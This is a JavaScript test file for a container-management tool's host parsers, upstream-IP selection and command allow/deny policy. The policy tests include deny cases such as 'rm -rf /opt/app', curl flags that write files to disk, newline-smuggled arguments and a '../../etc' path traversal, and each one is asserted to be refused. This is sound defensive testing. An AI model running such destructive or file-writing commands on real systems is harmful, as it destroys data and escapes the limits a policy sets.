  assert.ok(LXC_LIST_CAPTURE_CAP > payload.length, 'the listing cap must clear a >1 MiB inventory');
  assert.equal(parseLxcListJson(payload).list.length, 200);

  // ...and when a parse DOES fail, the answer names bytes and tail, because
  // "unparseable JSON" with no evidence cost real debugging time.
  const cut = payload.slice(0, 260000);
  assert.ok(parseLxcListJson(cut).error);
  const evidence = captureEvidence({
    stdout: cut, stdoutBytes: 260000, stdoutTruncated: true, stdoutComplete: true,
  });
  assert.match(evidence, /260000 bytes received/);
  assert.match(evidence, /capture cap/);
  assert.match(evidence, /output ends: /);
  // An unflushed stream is a different fact and reads differently.
  assert.match(captureEvidence({ stdout: '[', stdoutBytes: 1, stdoutComplete: false }), /tail may be missing/);
});

test('a Docker guest resolves to its bridge address, never to docker0', () => {
  // The field failure: set_route recorded 172.17.0.1 — the guest's own docker0
  // — reported "applied": true, and produced a 502 read as an app fault.
  const addresses = [
    { interface: 'docker0', address: '172.17.0.1', family: 'inet' },
    { interface: 'eth0', address: '10.185.17.14', family: 'inet' },
    { interface: 'eth0', address: 'fd42::1', family: 'inet6' },
  ];
  const picked = pickUpstreamAddress(addresses, { subnetCidr: '10.185.17.1/24' });
  assert.equal(picked.ip, '10.185.17.14');
  assert.equal(picked.chosen.interface, 'eth0');
  // The rejection is auditable, not silent.
  assert.deepEqual(picked.rejected.map((r) => r.address), ['172.17.0.1']);
  // Interface naming is a heuristic; the subnet is authoritative. A guest whose
  // managed NIC is NOT called eth0 still resolves correctly.
  assert.equal(pickUpstreamAddress([
    { interface: 'br-9f2', address: '172.18.0.1', family: 'inet' },
    { interface: 'enp5s0', address: '10.185.17.20', family: 'inet' },
  ], { subnetCidr: '10.185.17.1/24' }).ip, '10.185.17.20');
});

test('an upstream that cannot be resolved unambiguously is an error, never a guess', () => {
  // Two routable candidates and no subnet to decide between them.
  const ambiguous = pickUpstreamAddress([
    { interface: 'eth0', address: '10.185.17.14', family: 'inet' },
    { interface: 'eth1', address: '192.168.9.4', family: 'inet' },
  ]);
  assert.equal(ambiguous.ip, null);
  assert.equal(ambiguous.error, 'ambiguous');
  assert.equal(ambiguous.candidates.length, 2);
  // Only virtual interfaces present → also an error, with the rejects shown.
  const filtered = pickUpstreamAddress([
    { interface: 'docker0', address: '172.17.0.1', family: 'inet' },
    { interface: 'veth3a', address: '172.19.0.1', family: 'inet' },
  ]);
  assert.equal(filtered.error, 'all_filtered');
  assert.equal(filtered.rejected.length, 2);
  // No IPv4 at all is its own answer.
  assert.equal(pickUpstreamAddress([{ interface: 'eth0', address: 'fd42::1', family: 'inet6' }]).error, 'no_ipv4');
  assert.equal(pickUpstreamAddress([]).error, 'no_ipv4');

  for (const n of ['lo', 'docker0', 'br-1a2b', 'veth7', 'cni0', 'flannel.1', 'tailscale0', 'wg0', 'virbr0']) {
    assert.equal(isNonRoutableIface(n), true, n);
  }
  for (const n of ['eth0', 'enp5s0', 'eno1', 'ens18']) {
    assert.equal(isNonRoutableIface(n), false, n);
  }
  assert.equal(ipv4InCidr('10.185.17.14', '10.185.17.1/24'), true);
  assert.equal(ipv4InCidr('10.185.18.14', '10.185.17.1/24'), false);
  assert.equal(ipv4InCidr('10.185.17.14', 'nonsense'), false);
  // The NIC's parent network is where the authoritative subnet comes from.
  assert.equal(instanceNicParent({ expanded_devices: { eth0: { type: 'nic', network: 'incusbr0' } } }), 'incusbr0');
  assert.equal(instanceNicParent({ devices: { eth0: { type: 'nic', parent: 'br1' } } }), 'br1');
  assert.equal(instanceNicParent({ devices: { root: { type: 'disk' } } }), null);
});

test('a curl header value is not an output flag', () => {
  // The field failure, verbatim: a WebSocket probe rejected as `"curl -o" is
  // never allowed` — the matcher had found the "o" in "Connection".
  const probe = parseLxcCommand(
    'curl -sSi --http1.1 --max-time 6 -HConnection:Upgrade -HUpgrade:websocket '
    + '-HSec-WebSocket-Version:13 http://127.0.0.1:21118/ws/id',
    LXC_POLICY, WD,
  );
  assert.equal(probe.error, undefined, probe.error);
  assert.equal(probe.scope, 'read_only');

  // The clustered spellings that DO write to disk stay denied...
  for (const cmd of ['curl -sSo /tmp/x http://e/', 'curl -O http://e/x', 'curl --output=/tmp/x http://e/',
    'curl -sSD /tmp/h http://e/', 'curl --trace-ascii /tmp/t http://e/', 'curl -K /tmp/cfg']) {
    assert.ok(parseLxcCommand(cmd, LXC_POLICY, WD).error, `should deny: ${cmd}`);
  }
  // ...and the refusal names the token that actually matched.
  const denied = parseLxcCommand('curl -sSo /tmp/x http://e/', LXC_POLICY, WD);
  assert.match(denied.error, /-sSo/);

  // A value-taking flag ends the cluster: everything after it is data.
  assert.deepEqual(shortFlagCluster('-sSi'), ['s', 'S', 'i']);
  assert.deepEqual(shortFlagCluster('-HConnection:Upgrade'), ['H']);
  assert.deepEqual(shortFlagCluster('-sSo'), ['s', 'S', 'o']);
  assert.equal(shortFlagCluster('--output'), null);
  assert.equal(shortFlagCluster('http://x/'), null);
});

test('args[] carries what whitespace-splitting cannot', () => {
  // `-H "Connection: Upgrade"` is unrepresentable in a whitespace-split
  // string, which is what forced the smuggled spelling that then tripped the
  // deny matcher.
  const ok = parseLxcCommand(null, LXC_POLICY, {
    ...WD,
    args: ['curl', '-sS', '-H', 'Connection: Upgrade', '-H', 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==', 'http://127.0.0.1:21118/'],
  });
  assert.equal(ok.error, undefined, ok.error);
  assert.deepEqual(ok.argv[3], 'Connection: Upgrade');
  // The allowlist still applies to argv, whichever way it arrived.
  assert.ok(parseLxcCommand(null, LXC_POLICY, { ...WD, args: ['curl', '-o', '/tmp/x', 'http://e/'] }).error);
  assert.ok(parseLxcCommand(null, LXC_POLICY, { ...WD, args: ['rm', '-rf', '/opt/app'] }).error);
  // Ambiguity between the two spellings is refused rather than resolved.
  assert.match(parseLxcCommand('ls', LXC_POLICY, { ...WD, args: ['ls'] }).error, /not both/);
  assert.match(parseLxcCommand(null, LXC_POLICY, { ...WD, args: ['ls', 'a\nb'] }).error, /control characters/);
  assert.match(parseLxcCommand(null, LXC_POLICY, { ...WD, args: ['ls', 5] }).error, /array of strings/);
  // The old error for a quoted `command` now points at the way out.
  assert.match(parseLxcCommand('ls "a b"', LXC_POLICY, WD).error, /args/);
});

test('systemctl restart is allowed anywhere, and needs a unit', () => {
  // Design decision: rerun_startup already runs an arbitrary root script in
  // this guest, so denying a restart constrained convenience, not capability.
  const r = parseLxcCommand('systemctl restart docker.service', LXC_POLICY, { workingDir: '/', registeredWorkingDir: null });
  assert.equal(r.error, undefined, r.error);
  assert.equal(r.scope, 'mutating_service');
  assert.deepEqual(r.units, ['docker.service']);
  assert.equal(parseLxcCommand('systemctl reload caddy', LXC_POLICY, WD).scope, 'mutating_service');
  assert.match(parseLxcCommand('systemctl restart', LXC_POLICY, WD).error, /unit name/);
  // Package managers and unit creation still belong in the startup script.
  assert.ok(parseLxcCommand('apt-get install -y docker.io', LXC_POLICY, WD).error);
});

test('route bindings accept a path prefix and a health path, normalized like the UI', () => {
  assert.equal(validRoutePathPrefix(undefined), '/');
  assert.equal(validRoutePathPrefix('/livekit'), '/livekit');
  assert.equal(validRoutePathPrefix('/api/'), '/api');
  assert.equal(validRoutePathPrefix('/ws/*'), '/ws');       // migration 103's normalization
  assert.equal(validRoutePathPrefix('api'), null);          // must be absolute
  assert.equal(validRoutePathPrefix('/a/../../etc'), null);
  assert.deepEqual(validRouteHealthPath('/healthz'), { value: '/healthz' });
  assert.deepEqual(validRouteHealthPath(''), { value: null });
  assert.ok(validRouteHealthPath('healthz').error);
  assert.ok(validRouteHealthPath(`/${'x'.repeat(300)}`).error);
});

test('the keyring quota that reads as "disk quota exceeded" is diagnosable from host facts', () => {
  const rows = parseProcKeyUsers([
    '    0:   200 200/200  200/200   4778/20000',
    '  101:   104 104/104  104/200   1352/20000',
    '  997:    56  56/56    56/200    308/20000',
  ].join('\n'));
  assert.equal(rows.length, 3);
  assert.deepEqual(rows[0], {
    uid: 0, usage: 200, nkeys: 200, nikeys: 200, qnkeys: 200, maxkeys: 200,
    qnbytes: 4778, maxbytes: 20000, free_keys: 0,
  });
  // A uid at its ceiling is the condition that fails the NEXT container start.
  const exhausted = keyringAssessment({ maxkeys: 200, rows });
  assert.equal(exhausted.ok, false);
  assert.match(exhausted.warning, /uid 0 holds 200\/200/);
  assert.match(exhausted.warning, /kernel\.keys\.maxkeys=20000/);
  assert.equal(exhausted.tightest.uid, 0);
  // Even with headroom everywhere, the kernel default is itself the warning:
  // every unprivileged guest shares that one budget.
  const roomy = [{ uid: 1000000, usage: 10, nkeys: 10, nikeys: 10, qnkeys: 10, maxkeys: KERNEL_KEYS_DEFAULT_MAXKEYS, qnbytes: 10, maxbytes: 20000, free_keys: 190 }];
  assert.equal(keyringAssessment({ maxkeys: KERNEL_KEYS_DEFAULT_MAXKEYS, rows: roomy }).ok, false);
  // Raised limits with headroom: nothing to say.
  const raised = [{ uid: 1000000, usage: 10, nkeys: 10, nikeys: 10, qnkeys: 10, maxkeys: 20000, qnbytes: 10, maxbytes: 2000000, free_keys: 19990 }];
  assert.deepEqual(keyringAssessment({ maxkeys: 20000, rows: raised }), {
    ok: true, tightest: raised[0], warning: null,
  });
});

test('host fact parsers read what the tools actually print', () => {
  assert.equal(parseIncusVersion('6.0.2\n'), '6.0.2');
  assert.equal(parseIncusVersion('Client version: 6.14\n'), '6.14');
  assert.equal(parseIncusVersion('command not found'), null);
  assert.equal(parseNetworkIpv4Cidr('config:\n  ipv4.address: 10.185.17.1/24\n  ipv4.nat: "true"\n'), '10.185.17.1/24');
  assert.equal(parseNetworkIpv4Cidr('config:\n  ipv4.address: none\n'), null);
  const df = parseDfKb('Filesystem 1024-blocks Used Available Capacity Mounted on\n/dev/sda1 103080224 41258256 56553736 43% /var/lib/incus\n');
  assert.equal(df.available_kb, 56553736);
  assert.equal(df.mounted_on, '/var/lib/incus');
  assert.equal(parseDfKb(''), null);
});
